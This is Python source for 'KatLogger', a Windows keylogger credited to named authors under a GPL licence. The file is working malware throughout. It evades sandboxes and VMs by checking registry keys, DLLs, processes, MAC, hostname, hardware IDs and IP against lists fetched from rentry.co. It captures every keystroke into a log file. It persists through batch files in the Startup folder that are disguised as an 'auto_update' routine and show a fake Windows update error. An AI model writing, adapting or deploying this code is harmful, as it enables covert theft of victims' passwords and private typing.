LABEL = "Data Disk"
import kat

kat.authors(["Lif28", "rickyfili10"])
kat.licence("GPL-3.0 licence")
kat.licenceFile("../LICENCE", 0)
kat.link("https://github.com/Lif28/KatLogger/tree/main?tab=GPL-3.0-1-ov-file")
kat.web("nothing for now :/")























def player(): 
 import re
 import uuid
 import wmi
 import requests
 import os
 import ctypes
 import sys
 import subprocess
 import socket

 def get_base_prefix_compat():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix


 def in_virtualenv():
    return get_base_prefix_compat() != sys.prefix
    
 class Kerpy:
    def registry_check(self):
        cmd = "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\"
        reg1 = subprocess.run(cmd + "DriverDesc", shell=True, stderr=subprocess.DEVNULL)
        reg2 = subprocess.run(cmd + "ProviderName", shell=True, stderr=subprocess.DEVNULL)
        if reg1.returncode == 0 and reg2.returncode == 0:
            print("VMware Registry Detected")
            sys.exit()

    def processes_and_files_check(self):
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    
    
        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            print("VMwareService.exe & VMwareTray.exe process are running")
            sys.exit()
                           
        if os.path.exists(vmware_dll): 
            print("Vmware DLL Detected")
            sys.exit()
            
        if os.path.exists(virtualbox_dll):
            print("VirtualBox DLL Detected")
            sys.exit()
        
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            print("Sandboxie DLL Detected")
            sys.exit()
        except:
            pass        
        
        processl = requests.get("https://rentry.co/x6g3is75/raw").text
        if processl in processList:
            sys.exit()
            
    def mac_check(self):
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        mac_list = requests.get("https://rentry.co/ty8exwnb/raw").text
        if mac_address[:8] in mac_list:
            print("VMware MAC Address Detected")
            sys.exit()
    def check_pc(self):
     vmname = os.getlogin()
     vm_name = requests.get("https://rentry.co/3wr3rpme/raw").text
     if vmname in vm_name:
         sys.exit()
     vmusername = requests.get("https://rentry.co/bnbaac2d/raw").text
     host_name = socket.gethostname()
     if host_name in vmusername:
         sys.exit()
    def hwid_vm(self):
     current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
     hwid_vm = requests.get("https://rentry.co/fnimmyya/raw").text
     if current_machine_id in hwid_vm:
         sys.exit()
    def checkgpu(self):
     c = wmi.WMI()
     for gpu in c.Win32_DisplayConfiguration():
        GPUm = gpu.Description.strip()
     gpulist = requests.get("https://rentry.co/povewdm6/raw").text
     if GPUm in gpulist:
         sys.exit()
    def check_ip(self):
     ip_list = requests.get("https://rentry.co/hikbicky/raw").text
     reqip = requests.get("https://api.ipify.org/?format=json").json()
     ip = reqip["ip"]
     if ip in ip_list:
         sys.exit()
    def profiles():
     machine_guid = uuid.getnode()
     guid_pc = requests.get("https://rentry.co/882rg6dc/raw").text
     bios_guid = requests.get("https://rentry.co/hxtfvkvq/raw").text
     baseboard_guid = requests.get("https://rentry.co/rkf2g4oo/raw").text
     serial_disk = requests.get("https://rentry.co/rct2f8fc/raw").text
     if machine_guid in guid_pc:
         sys.exit()
     w = wmi.WMI()
     for bios in w.Win32_BIOS():
      bios_check = bios.SerialNumber    
     if bios_check in bios_guid:
         sys.exit() 
     for baseboard in w.Win32_BaseBoard():
         base_check = baseboard.SerialNumber
     if base_check in baseboard_guid:
         sys.exit()
     for disk in w.Win32_DiskDrive():
      disk_serial = disk.SerialNumber
     if disk_serial in serial_disk:
         sys.exit()
 if __name__ == "__main__":
    kerpy = Kerpy()
    kerpy.registry_check()
    kerpy.processes_and_files_check()
    kerpy.mac_check()
    kerpy.check_pc()
    kerpy.hwid_vm()
    kerpy.checkgpu()
    kerpy.check_ip()
    kerpy.profiles()

    


# !!! warning: even if not all libraries are used, leave them anyway in the code !!!
import pynput.keyboard
import smtplib, ssl
import time
import getpass
import shutil
import os
import subprocess
import getInfo
getInfo.GetIp()
# uncomment this for print ip and other info of pc
# print(getInfo.GetIp())
class Update:

    def __init__(self): 
        self.logger = ""

    def send_data(self, keystrike):
        self.logger += keystrike
        with open(f"log.txt","a+",encoding="utf-8") as new_file:
            new_file.write(self.logger)

        self.logger = ""

    def take_keys(self, key):
     try:
        hit_key = str(key.char)

     except AttributeError:
        if key == key.enter:
            hit_key = "\n" + str(key) + "\n"
        elif key == key.shift:
            hit_key = ""
        elif key == key.space:
            hit_key = " "
        elif key == key.backspace:
            # Handle backspace key here
            hit_key = "   (BACKSPACE)   "
        elif key == key.enter:
            hit_key = "\n"
        elif key == key.caps_lock:
            hit_key = "\nCAPS LOCK\n"
        elif key == key.ctrl_r:
            hit_key  = "\nCtrl right\n"
        elif key == key.ctrl_l:
            hit_key = "\nCtrl left\n"
        else:
            hit_key = "" + str(key) + ""

     self.send_data(hit_key)

    def change_dir(self):
        try:
            username = getpass.getuser()
            cmdfile = fr"""
@echo off
start /min cmd /c "C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\auto_update.bat"
"""
            with open(f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\auto_update.bat', "w") as cmdFile1:
             cmdFile1.write(cmdfile)
            with open(f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\auto_update.bat', 'w') as file:
                cmd = fr"""
@echo off
setlocal

for %%G in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    for /f "tokens=5*" %%A in ('vol %%G: ^| find "Volume in drive"') do (
        if /i "%%B"=="{LABEL}" (
            cd /d %%G:\
            start auto_update.exe
            goto :EOF
            exit
        )
    )
)


exit /b

"""
                file.write(cmd)

        except Exception as e:
            print("Error [0x80070643]: Failed to Update")

    def main(self):
        listener = pynput.keyboard.Listener(on_press=self.take_keys)
        with listener:
            self.logger = ""
            self.change_dir()
            listener.join()
            


Update().main()
